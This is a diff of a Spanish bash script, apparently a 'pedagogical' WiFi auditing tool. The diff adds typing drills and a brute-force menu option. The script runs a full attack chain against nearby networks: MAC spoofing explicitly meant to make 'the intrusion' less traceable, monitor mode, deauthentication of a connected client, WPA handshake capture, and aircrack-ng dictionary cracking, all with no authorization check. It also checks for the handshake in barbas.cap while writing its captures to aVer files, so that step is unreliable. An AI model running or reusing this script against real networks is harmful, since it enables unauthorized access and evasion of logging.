@@ -110,8 +110,8 @@ echo -e "\e[0m----------MENU DE OPCIONES----------"
 echo -e "\e[7m(Recomendación: seguir el orden numérico)"
 echo -e "\e[0m"
 COLUMNS=12
-PS3=$'\e[93m\n'"Elija una opción."$'\n'"-----------------"$'\n\n'"1: Revisar dependencias"$'\n'"2: Falsificación de dirección MAC"$'\n'"3: Tarjeta en Modo Monitor"$'\n'"4: Ataque por deautenticación"$'\n'"5: SALIR "$'\e[0m\n'
-options=("Opción 1 - Revisar dependencias" "Opción 2 - Falsificación de dirección MAC" "Opción 3 - Tarjeta en Modo Monitor" "Opción 4 - Ataque por deautenticación" "Salir")
+PS3=$'\e[93m\n'"Elija una opción."$'\n'"-----------------"$'\n\n'"1: Revisar dependencias"$'\n'"2: Falsificación de dirección MAC"$'\n'"3: Tarjeta en Modo Monitor"$'\n'"4: Ataque por deautenticación"$'\n'"5: Ataque por Fuerza Bruta"$'\n'"6: SALIR "$'\e[0m\n'
+options=("Opción 1 - Revisar dependencias" "Opción 2 - Falsificación de dirección MAC" "Opción 3 - Tarjeta en Modo Monitor" "Opción 4 - Ataque por deautenticación" "Opción 5 - Ataque por Fuerza Bruta" "Salir")
 select opt in "${options[@]}"
 do
     case $opt in
@@ -119,8 +119,8 @@ do
         clear
             echo -e "\n\n\e[93mHa elegido la opcion 1. Revisar dependencias."
             echo -e "\nPara el uso de esta herramienta pedagógica son necesarias una serie de dependencias."
-            echo -e "\nCon esta opción revisaremos si están correctamente instaladas.\n"
-            echo -e "Lo haremos lanzando el script  booleano:\n\n\e[0mif command -v <DEPENDENCIA> >/dev/null\nthen\necho -e \"<DEPENDENCIA> is installed\"\nelse\necho -e\"<DEPENDENCIA> is not installed\"\nfi\n\n\n"
+            echo -e "Con esta opción revisaremos si están correctamente instaladas."
+            echo -e "Lo haremos lanzando el script  booleano:\n\n\n\n\e[0mif command -v <DEPENDENCIA> >/dev/null\nthen\necho -e \"<DEPENDENCIA> is installed\"\nelse\necho -e\"<DEPENDENCIA> is not installed\"\nfi\n\n\n"
             read -t 60 -n 1 -s -r -p "Presione cualquier tecla para continuar."
 			clear
 if command -v airodump-ng >/dev/null
@@ -197,28 +197,43 @@ clear
              read -t 60 -n 1 -s -r -p "Presione cualquier tecla para continuar."
              clear
              echo -e "\n\e[93mHay que tratar de dificultar el rastreo de nuestra auditoría."
-             echo -e "\nUna buena práctica en la auditoría es falsificar la dirección unívoca de nuestra tarjeta de red.\n"
+             echo -e "Una buena práctica en la auditoría es falsificar la dirección unívoca de nuestra tarjeta de red."
              echo -e "Pero lo primero es saber lo que es una dirección MAC.\n\n\n\n\e[0m"
              read -t 60 -n 1 -s -r -p "Presione cualquier tecla para continuar."
              clear
-             echo -e "\e[93mLa dirección MAC es el identificador que se asigna a las tarjetas de red\n\nde cualquier dispositivo con conectividad.\n"
-             echo -e "Es única y se le llama también dirección física.\n"
+             echo -e "\e[93mLa dirección MAC es el identificador que se asigna a las tarjetas de red\nde cualquier dispositivo con conectividad."
+             echo -e "Es única y se le llama también dirección física."
              echo -e "Es unívoco para cada dispositivo con conectividad.\n\n\n\e[0m"
              read -t 60 -n 1 -s -r -p "Presione cualquier tecla para continuar."
              clear
-             echo -e "\e[93mEn nuestros intentos de acceso a la red podemos dejar rastros,\n\npor ejemplo en el registro de logs,\n\nasí que falsificaremos la MAC"
-             echo -e "\nPara ello utilizaremos una herramienta llamada MacChanger."
-             echo -e "\nSu uso es muy sencillo y nos permitirá modificar la MAC, como también restaurarla si así lo deseamos.\e[0m\n\n\n\n"
+             echo -e "\e[93mEn nuestros intentos de acceso a la red podemos dejar rastros,\npor ejemplo en un registro de logs,\nasí que falsificaremos la MAC."
+             echo -e "Para ello utilizaremos una herramienta llamada MacChanger."
+             echo -e "\nSu uso es muy sencillo y nos permitirá modificar la MAC, como también restaurarla si así lo deseamos.\e[0m\n\n"
              read -t 60 -n 1 -s -r -p "Presione cualquier tecla para continuar."
              clear
-             echo -e "\n\n\e[93mEstos son los comandos que permite la herramienta MacChanger:\n"
              echo -e "Lanzamos \e[0mmacchanger --help\n\n"
+             until [[ $WANSWER = "macchanger --help" ]]
+              do
+                 echo -e "\n\e[93mEscriba \e[0mmacchanger --help\n"
+                 read WANSWER
+              done
+                 echo -e "\nBien. Continuamos.\n"
+                 sleep 2
+                 clear
+              echo -e "\n\n\e[93mEstos son los comandos que permite la herramienta MacChanger:\n\e[0m"
              macchanger --help
              echo -e "\n"
              read -t 60 -n 1 -s -r -p "Presione cualquier tecla para continuar."
              clear
              echo -e "\n\n\e[93mVolvemos a revisar las tarjetas de red disponibles en este dispositivo con \e[0miwconfig"
              echo -e "\niwconfig"
+             until [[ $WANSWER = "iwconfig" ]]
+               do
+                  echo -e "\n\e[93mEscriba \e[0miwconfig\n"
+                  read WANSWER
+               done
+                  echo -e "\nBien. Continuamos.\n"
+                  sleep 2
               echo -e "\n\e[32m---------------Lista de sus tarjetas de red disponibles---------------"
               echo -e "\e[0m"
               iwconfig
@@ -226,43 +241,89 @@ clear
               echo -e "\e[0m\n"
               read -t 60 -n 1 -s -r -p "Presione cualquier tecla para continuar."
               echo -e "\n\n\e[93mY ahora escriba el nombre de una de ellas para ver su MAC actual y su MAC permanente."
-              echo -e "\nEstas dos no tienen por qué ser la misma. Pueden haber sido cambiadas.\n\e[0m"
+              echo -e "Ejemplo de tarjetas de red: \e[0mwlan0, wlan0mon, etc.\e[93m"
+              echo -e "Estas dos no tienen por qué ser la misma. Pueden haber sido cambiadas.\n\e[0m"
               read MACAUDITOR
               clear
               echo -e "\n\e[93mLanzamos la instrucción \e[0mmacchanger -s $MACAUDITOR\n"
+				until [[ $WANSWER = "macchanger -s $MACAUDITOR" ]]
+				do
+				echo -e "\n\e[93mEscriba \e[0mmacchanger -s $MACAUDITOR\n"
+				read WANSWER
+				done
+				echo -e "\nBien. Continuamos.\n"
+				sleep 2
               macchanger -s $MACAUDITOR
               echo ""
               echo -e "\e[93m Y aquí comprobamos ambas MAC.\n\e[0m"
               read -t 60 -n 1 -s -r -p "Presione cualquier tecla para continuar."
               clear 
-              echo -e "\n\e[93mEl paso siguiente será elegir una MAC adress a la que cambiar.\n"
-              echo -e "Escoja una palabra clave o una parte de ella. Ej: Apple, Tp-Link, Ubiquiti, Cisco, Tp-\n\e[0m"
+              echo -e "\n\e[93mEl paso siguiente será elegir una nueva dirección MAC."
+              echo -e "Escoja una palabra clave o una parte de ella. \nEjemplo: \e[0mApple, App, Tp-Link, Tp-, Ubiquiti, Ubi, Cisco, Cis, etc.\n"
               read KWMACAUDITOR
+              echo -e "\n\e[93mLanzamos \e[0mmacchanger -l | grep -i $KWMACAUDITOR\n"
+				until [[ $WANSWER = "macchanger -l | grep -i $KWMACAUDITOR" ]]
+				do
+				echo -e "\n\e[93mEscriba \e[0mmacchanger -l | grep -i $KWMACAUDITOR\n"
+				read WANSWER
+				done
+				echo -e "\nBien. Continuamos.\n"
+				sleep 2
               macchanger -l $MACAUDITOR | grep -i $KWMACAUDITOR
-              echo -e "\n\e[93mHemos lanzado \e[0mmacchanger -l $MACAUDITOR | grep -i $KWMACAUDITOR"
-              echo -e "\n\e[93mY esta de arriba es la lista con los resultados."
+              echo -e "\n\e[93mHemos lanzado \e[0mmacchanger -l | grep -i $KWMACAUDITOR"
+              echo -e "\e[93mY esta de arriba es la lista con los resultados."
               echo -e "\nEl fabricante es identificado por las 3 primeras parejas y son las que respetaremos."
-              echo -e "\nLas segundas 3 parejas las pondremos al azar.\e[0m" 
-              echo ""
+              echo -e "Las segundas 3 parejas las pondremos al azar.\e[0m\n" 
               read -t 60 -n 1 -s -r -p "Presione cualquier tecla para continuar."
-              echo -e "\n\e[93mPara cambiar la MAC de la tarjeta $MACAUDITOR "
-              echo -e "\ncombinaremos las 3 primeras parejas del fabricante elegido con 3 al azar."
-              echo -e "\nEscoja los 3 primeros de un fabricante y Auditor00 completará el resto."
-              echo -e "\nEjemplo e8:de:27\e[0m\n"
+              echo -e "\n\n\e[93mPara cambiar la MAC de la tarjeta \e[0m$MACAUDITOR\e[93m"
+              echo -e "combinaremos las 3 primeras parejas del fabricante elegido con 3 al azar."
+              echo -e "\nEscoja los 3 primeros pares de un fabricante de la lista de arriba"
+              echo -e "y Auditor00 completará el resto."
+              echo -e "\nLos 3 primeros pares tienen este formato \e[0m00:00:00\n"
               read NUEVAMACAUDITOR
               clear
-              echo -e "\n\e[93mEsta va a ser su nueva MAC en la tarjeta $MACAUDITOR:\e[0m\n"
+              echo -e "\n\e[93mEsta es su MAC actual\e[0m\n"
+              macchanger -s $MACAUDITOR
+              echo -e "\n\e[93mY esta va a ser su nueva MAC en la tarjeta $MACAUDITOR:\e[0m\n"
               NUEVAMACRANDOM="$NUEVAMACAUDITOR:a$(($RANDOM%10)):c$(($RANDOM%10)):d$(($RANDOM%10))"
               echo -e "$NUEVAMACRANDOM\n"
               echo -e "\e[93mAntes de nada Lanzamos\e[0m sudo ifconfig $MACAUDITOR down \e[93mo no nos dejará cambiarla."
+               until [[ $WANSWER = "sudo ifconfig $MACAUDITOR down" ]]
+                 do
+                 echo -e "\n\e[93mEscriba \e[0msudo ifconfig $MACAUDITOR down\n"
+                 read WANSWER
+                 done
+                 echo -e "\nBien. Continuamos.\n"
+                 sleep 2
 			  sudo ifconfig $MACAUDITOR down
               echo -e "\n\e[93mLanzamos \e[0msudo macchanger -m $NUEVAMACRANDOM $MACAUDITOR\n"
+				until [[ $WANSWER = "sudo macchanger -m $NUEVAMACRANDOM $MACAUDITOR" ]]
+				do
+				echo -e "\n\e[93mEscriba \e[0msudo macchanger -m $NUEVAMACRANDOM $MACAUDITOR\n"
+				read WANSWER
+				done
+				echo -e "\nBien. Continuamos.\n"
+				sleep 2 
               sudo macchanger -m $NUEVAMACRANDOM $MACAUDITOR
               echo -e ""
-              echo -e "\n\e[93mAhora la MAC es reconocida como el fabricante escogido.\n\e[0m"
-              macchanger -s $MACAUDITOR 
+              echo -e "\n\e[93mAhora comprobamos que tiene la nueva MAC del fabricante escogido.\n\e[0m"
+				until [[ $WANSWER = "sudo macchanger -s $MACAUDITOR" ]]
+				do
+				echo -e "\n\e[93mEscriba \e[0msudo macchanger -s $MACAUDITOR\n"
+				read WANSWER
+				done
+				echo -e "\nBien. Continuamos.\n"
+				sleep 2 
+              sudo macchanger -s $MACAUDITOR 
               echo -e "\n\e[93mY podemos seguir con la intrusión algo menos rastreables.\n"
               echo -e "Volvemos a levantar\e[0m sudo ifconfig $MACAUDITOR up\n"
+				until [[ $WANSWER = "sudo ifconfig $MACAUDITOR up" ]]
+				do
+				echo -e "\n\e[93mEscriba \e[0msudo ifconfig $MACAUDITOR up\n"
+				read WANSWER
+				done
+				echo -e "\nBien. Continuamos.\n"
+				sleep 2
               sudo ifconfig $MACAUDITOR up
               read -t 60 -n 1 -s -r -p "Presione cualquier tecla para continuar."
               clear
@@ -275,15 +336,22 @@ clear
             read -t 60 -n 1 -s -r -p "Presione cualquier tecla para continuar."
             clear
             echo -e "\n\n\e[93mEl modo Monitor es un estado de las tarjetas para redes inalámbricas,"
-            echo -e "\nel cual nos permite capturar todos los tipos de paquetes transmitidos por WiFi.\n\n\e[0m"
+            echo -e "el cual nos permite capturar todos los tipos de paquetes transmitidos por WiFi.\n\n\e[0m"
             read -t 60 -n 1 -s -r -p "Presione cualquier tecla para continuar."
             clear
             echo -e "\n\n\e[93mPara auditar cualquier red WiFi lo primero es poner nuestra tarjeta de redes wireless en modo monitor."
-            echo -e "\nInterceptaremos el tráfico para evaluar la robustez de la red.\e[0m\n\n"
+            echo -e "Interceptaremos el tráfico para evaluar la robustez de la red.\e[0m\n\n"
             read -t 60 -n 1 -s -r -p "Presione cualquier tecla para continuar."
             clear
             echo -e "\n\n\e[93mCon el comando \e[0miwconfig\e[93m, listamos las tarjetas de red wireless disponibles.\e[0m"
-			echo -e "\niwconfig"
+			echo -e "\n\e[0miwconfig"
+             until [[ $WANSWER = "iwconfig" ]]
+               do
+                  echo -e "\n\e[93mEscriba \e[0miwconfig\n"
+                  read WANSWER
+               done
+                  echo -e "\nBien. Continuamos.\n"
+                  sleep 2
             echo -e "\n\e[32m---------------Lista de sus tarjetas de red disponibles---------------"
             echo -e "\e[0m"
             iwconfig
@@ -291,15 +359,22 @@ clear
             echo -e "\e[0m\n"
             read -t 60 -n 1 -s -r -p "Presione cualquier tecla para continuar."
             echo -e "\e[93m\n\nEs necesario activar el modo monitor de una tarjeta wireless."
-            echo -e "\nPara ello utilizaremos la herramienta airmon-ng de la suite Aircrack-ng."
-            echo -e "\nLanzaremos la instrucción \e[0mairmon-ng start <TARJETA DE RED>\n"
+            echo -e "Para ello utilizaremos la herramienta airmon-ng de la suite Aircrack-ng."
+            echo -e "Lanzaremos la instrucción \e[0mairmon-ng start <TARJETA DE RED>\n"
             read -t 60 -n 1 -s -r -p "Presione cualquier tecla para continuar."
             echo -e "\n\n\e[93mEscoja una de las tarjetas de red disponibles en la lista de arriba:"
             echo -e "\e[91m(NO SELECCIONAR tarjetas no wireless extensions ya que no son tarjetas inalámbricas)\e[0m\n"
             read NIC
             sleep 1
-            echo -e "\n\e[93mLanzamos la instrucción: \e[0msudo airmon-ng start $NIC 2>/dev/null\e[0m"
-            sudo airmon-ng start $NIC 2>/dev/null
+            echo -e "\n\e[93mLanzamos la instrucción: \e[0msudo airmon-ng start $NIC\e[0m"
+             until [[ $WANSWER = "sudo airmon-ng start $NIC" ]]
+               do
+                  echo -e "\n\e[93mEscriba \e[0msudo airmon-ng start $NIC\n"
+                  read WANSWER
+               done
+                  echo -e "\nBien. Continuamos.\n"
+                  sleep 2
+            sudo airmon-ng start $NIC
             echo -e "\n"
             sleep 2
             echo -e "\e[93mLanzamos un script de COMPROBACION de activación:\n"
@@ -316,10 +391,17 @@ clear
  			 read -t 60 -n 1 -s -r -p "Presione cualquier tecla para continuar."
  			 clear
  			echo -e "\n\n\e[93mY seguidamente eliminaremos los procesos potencialmente conflictivos"
-            echo -e "\ncon la instrucción \e[0mairmon-ng check kill\n"
+            echo -e "con la instrucción \e[0mairmon-ng check kill\n"
             read -t 60 -n 1 -s -r -p "Presione cualquier tecla para continuar."
              echo -e "\n\n\e[93mAircrack recomienda eliminar procesos potencialmente conflictivos de este modo:"
              echo -e "\n\e[0m\nairmon-ng check kill\n"
+             until [[ $WANSWER = "sudo airmon-ng check kill" ]]
+               do
+                  echo -e "\n\e[93mEscriba \e[0msudo airmon-ng check kill\n"
+                  read WANSWER
+               done
+                  echo -e "\nBien. Continuamos.\n"
+                  sleep 2
              sudo airmon-ng check kill 2>/dev/null
 			 sleep 1 
 			 echo -e "\e[93mProcesos potencialmente conflictivos eliminados.\e[0m\n"
@@ -327,47 +409,72 @@ clear
 			 clear
             ;;
         "Opción 4 - Ataque por deautenticación")
-
-# --------------> I am working here now.
-
         clear
         	  echo -e "\e[93m\nEn el proceso de autenticación, cuando un dispositivo y un AP"
-        	  echo -e "\nse ponen de acuerdo, se produce un Handshake que es el que autorizará"
-        	  echo -e "\nal dispositivo para la conexión.\n\e[0m"
+        	  echo -e "se ponen de acuerdo, se produce un Handshake que es el que autorizará"
+        	  echo -e "al dispositivo para la conexión.\n\e[0m"
         	  read -t 60 -n 1 -s -r -p "Presione cualquier tecla para continuar."
         	  clear
               echo -e "\n\e[93mHa escogido Ataque por deautenticación."
-              echo -e "\Los router suelen contar con un sistema de expulsión de usuarios no confiables."
-              echo -e "\nDe este mecanismo se aprovecha la suite Aircrack con su herramienta Aireplay-ng."
-              echo -e "\nEn este modo de ataque, expulsa a los dispositivos enlazados"
-              echo -e "\nbuscando que se reconecten y capturar el handshake."
+              echo -e "\nLos router suelen contar con un sistema de expulsión de usuarios no confiables."
+              echo -e "De este mecanismo se aprovecha la suite Aircrack con su herramienta Aireplay-ng."
+              echo -e "En este modo de ataque, expulsa a los dispositivos enlazados"
+              echo -e "buscando que se reconecten y capturar el handshake.\e[0m\n"
         read -t 60 -n 1 -s -r -p "Presione cualquier tecla para continuar."
-              echo -e "Para escoger a nuestro target"
-              sleep 3
-              echo -e "el Punto de Acceso (AP) al que deseamos auditar"
-              sleep 3
-              echo -e "necesitamos el nombre que se le ha otorgado (ESSID)"
-              sleep 3
-              echo -e "En este proceso debe escoger un AP por su ESSID"
-              sleep 3
-              echo -e "\n\e[5mATENCION:\e[0m Cuando elija un ESSID..."
-              sleep 4
-              echo -e "...pulse Ctrl c para continuar"
+        clear
+              echo -e "\nLo primero listamos de nuevo las tarjetas de red."
+              echo -e "\e[0m\niwconfig"
+             until [[ $WANSWER = "iwconfig" ]]
+               do
+                  echo -e "\n\e[93mEscriba \e[0miwconfig\n"
+                  read WANSWER
+               done
+                  echo -e "\nBien. Continuamos.\n"
+                  sleep 2
+              echo -e "\n\e[32m---------------Lista de sus tarjetas de red disponibles---------------"
+             echo -e "\e[0m"
+             iwconfig
+             echo -e "\n\e[32m-----------------------------------------------------------------------"
+             echo -e "\e[93m\n"
+             echo -e "\nEscoja de la lista la tarjeta con la que vamos trabajar\e[0m"
+             read NIC
+             until [[ $WANSWER = "sudo airodump-ng $NIC" ]]
+               do
+                  echo -e "\e[93mAhora escanearemos qué AP hay disponibles"
+                  echo -e "\nEscriba \e[0msudo airodump-ng $NIC\n"
+                  read WANSWER
+               done
+                  echo -e "\nBien. Continuamos.\n"
+                  sleep 2
+              echo -e "\n\e[5mATENCION:\e[0m\e[93m Cuando elija un ESSID..."
+              echo -e "\npulse \e[0mCtrl c para continuar"
               sleep 5
               sudo airodump-ng $NIC 2>/dev/null
               sleep 1
-              echo -e "\nPor favor, escriba el ESSID del target a auditar: "
-              read WESSID             echo -e "También necesitamos el canal en el que opera, por favor:"
+               echo -e "\n\n\e[93mPara escoger a nuestro target"
+              echo -e "el Punto de Acceso (AP) al que deseamos auditar"
+              echo -e "necesitamos el nombre que se le ha otorgado (ESSID)"
+              echo -e "\nEn este proceso debe escoger un AP por su ESSID"
+              echo -e "\nPor favor, escriba el ESSID del target a auditar: \e[0m"
+              read WESSID
+              echo -e "\e[93mTambién necesitamos el canal (CH) en el que opera, por favor:\e[0m"
               read WCHANNEL
-              echo -e "Lanzamos una búsqueda más concreta sobre ese AP"
-              sleep 2
+              clear
+              echo -e "\e[93mLanzamos una búsqueda más concreta sobre ese AP"
               echo -e "Necesitamos encontrar dispositivos enlazados para lanzar un ataque de deautenticación."
-              sleep 4
-              echo -e "\n\e[5mATENCION:\e[0m Cuando elija la MAC de un dispositivo enlazado(STATION)..."
+             until [[ $WANSWER = "sudo airodump-ng wlan0 -c $WCHANNEL --essid $WESSID" ]]
+               do
+                  echo -e "\e[93mAhora escanearemos qué AP hay disponibles"
+                  echo -e "\nEscriba \e[0msudo airodump-ng wlan0 -c $WCHANNEL --essid $WESSID\n"
+                  read WANSWER
+               done
+                  echo -e "\nBien. Continuamos.\n"
+                  sleep 2
+              echo -e "\n\e[5mATENCION:\e[0m Cuando elija la MAC de un dispositivo enlazado (STATION)..."
               sleep 4
               echo -e "...pulse Ctrl c para continuar"
               sleep 4
-              sudo airodump-ng wlan0 -c $WCHANNEL --essid "$WESSID" 
+              sudo airodump-ng wlan0 -c $WCHANNEL --essid $WESSID 
               echo -e "\nAhora llega el momento de deautenticar al cliente enlazado."
               sleep 2
               echo -e "Una vez que se deutentique, tratará de autenticarse de nuevo."
@@ -376,6 +483,59 @@ clear
               read WSTATION
 			  sleep 2
               echo $WSTATION
+              funcion1(){ 
+				sudo airodump-ng --essid $WESSID -c $WCHANNEL -w aVer wlan0
+				}
+			  funcion2(){
+				sleep 2
+				sudo aireplay-ng -0 10 -e $WESSID -c $WSTATION wlan0
+				}
+			  funcion1 &
+			  funcion2
+			  sleep 15 && sudo killall airodump-ng
+			  if 
+				command aircrack-ng barbas.cap | grep "0 handshake" >/dev/null
+			  then
+				echo "Handshake no encontrado"
+				sudo rm aVer*
+				echo -e "Inténtelo nuevamente hasta lograrlo."
+				exit 0
+			  else
+				echo "Handshake capturado."
+				aircrack-ng barbas.cap
+				echo -e "\nUna vez capturado el Handshake el siguiente paso es"
+				echo -e "evaluar la fortaleza de la contraseña escogida."
+				echo -e "\nContinúe a la opción 5 Descifrado por Fuerza bruta.\e[0m"
+			  fi
+			  read -n 1 -s -r -p "Presione cualquier tecla para continuar."
+			  clear
+        ;;
+        "Opción 5 - Ataque por Fuerza Bruta")
+		clear
+        echo -e "\e[93mYa tenemos capturado el handshake."
+        echo -e "Ahora lo que vamos a hacer es comprobar la fortaleza de la password escogida."
+        echo -e "Lo haremos utilizando aircrack-ng lanzando la siguiente instrucción:"
+        echo -e "\n\e[0maircrack-ng <FILE.cap> -w <WORDLIST>\n"
+		echo -e "\nPero primero necesitamos el path del diccionario."
+		echo -e "\nAñádalo por favor:\n"
+		read WPATH
+		clear
+		echo -e "\e[93mSi en algún momento desea interrumpir el proceso"
+		echo -e "pulse cualquier tecla.\n\n\n\e[0m"
+		read -t 60 -n 1 -s -r -p "Presione cualquier tecla para continuar."
+		clear
+		echo -e "\e[0maircrack-ng <FILE.CAP> -w $WPATH"
+		sleep 4
+		aircrack-ng aVer-01.cap -w $WPATH -l password.txt &
+		read -t 60 -n 1 -r -p "Presione r para parar el proceso. " RESPUESTA
+		if [[ $RESPUESTA = "r" ]]
+        then
+        killall aircrack-ng
+        else
+        echo ""
+        read -t 60 -n 1 -s -r -p "Presione cualquier tecla para continuar."
+        fi
+        clear
         ;;
         "Salir")
             clear
